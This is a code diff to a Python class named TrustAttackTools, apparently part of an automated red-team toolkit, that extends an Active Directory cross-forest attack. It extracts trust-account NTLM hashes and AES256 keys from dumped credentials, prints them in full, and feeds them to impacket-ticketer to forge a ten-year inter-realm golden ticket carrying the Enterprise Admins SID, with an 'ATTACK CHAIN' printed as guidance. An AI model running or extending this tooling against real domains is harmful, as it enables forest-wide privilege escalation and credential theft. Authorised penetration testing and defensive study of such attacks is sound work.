@@ -1983,18 +1983,37 @@ class TrustAttackTools(Toolset):
                 re.IGNORECASE,
             )
 
+            # Also look for AES256 key (required for Windows 2016+)
+            # Format: DOMAIN\TRUSTACCOUNT$:aes256-cts-hmac-sha1-96:hexkey
+            aes_match = re.search(
+                rf"{trust_account}:aes256-cts-hmac-sha1-96:([a-fA-F0-9]{{64}})",
+                result,
+                re.IGNORECASE,
+            )
+            trust_aes_key = aes_match.group(1) if aes_match else None
+
             if hash_match:
                 trust_hash = hash_match.group(1)
+                aes_info = (
+                    f"\n   AES256: {trust_aes_key[:16]}...{trust_aes_key[-8:]}"
+                    if trust_aes_key
+                    else "\n   AES256: not found (may fail on Windows 2016+)"
+                )
                 logger.warning(
                     f"🎯 TRUST KEY EXTRACTED!\n"
                     f"   Trust: {domain} <-> {trusted_domain}\n"
                     f"   Account: {trust_account}\n"
-                    f"   Hash: {trust_hash[:8]}...{trust_hash[-8:]}"
+                    f"   Hash: {trust_hash[:8]}...{trust_hash[-8:]}{aes_info}"
+                )
+                aes_output = (
+                    f"\n→ AES256 key: {trust_aes_key}"
+                    if trust_aes_key
+                    else "\n→ AES256 key: not found (may need for Windows 2016+)"
                 )
                 result = (
                     f"🚨 TRUST KEY EXTRACTED FOR {trusted_domain}!\n"
                     f"→ Trust account: {trust_account}\n"
-                    f"→ NTLM hash: {trust_hash}\n"
+                    f"→ NTLM hash: {trust_hash}{aes_output}\n"
                     f"→ Use with create_inter_realm_ticket for cross-forest access\n"
                     f"→ ATTACK CHAIN:\n"
                     f"   1. Get both domain SIDs with get_sid\n"
@@ -2011,6 +2030,7 @@ class TrustAttackTools(Toolset):
                         hash_value=trust_hash,
                         hash_type="NTLM",
                         domain=domain,
+                        aes_key=trust_aes_key,  # Include AES key for Windows 2016+
                         source="trust_key_extraction",
                     )
                     if isinstance(self.state, SharedRedTeamState):
@@ -2033,6 +2053,7 @@ class TrustAttackTools(Toolset):
         target_sid: str,
         username: str = "Administrator",
         duration: int = 3650,
+        aes_key: str | None = None,
     ) -> str:
         """
         Create inter-realm golden ticket for cross-forest attack.
@@ -2048,6 +2069,7 @@ class TrustAttackTools(Toolset):
             target_sid: SID of target domain (from get_sid on target)
             username: User to impersonate (default: Administrator)
             duration: Ticket validity in days (default: 3650 = 10 years)
+            aes_key: AES256 key for Windows 2016+ (optional, preferred over NTLM)
 
         Returns:
             Ticket generation result (saves .ccache file)
@@ -2064,10 +2086,18 @@ class TrustAttackTools(Toolset):
         # Create Enterprise Admins SID for target forest (-519)
         enterprise_admin_sid = f"{target_sid}-519"
 
+        # Prefer AES256 key over NTLM hash for Windows 2016+
+        # RC4/NTLM tickets may fail with KDC_ERR_TGT_REVOKED
+        if aes_key:
+            logger.info("Using AES256 key for inter-realm ticket (Windows 2016+ compatible)")
+            key_args = ["-aesKey", aes_key]
+        else:
+            logger.warning("No AES key provided, using NTLM hash (may fail on Windows 2016+)")
+            key_args = ["-nthash", trust_key]
+
         cmd = [
             "impacket-ticketer",
-            "-nthash",
-            trust_key,
+            *key_args,
             "-domain-sid",
             source_sid,
             "-domain",
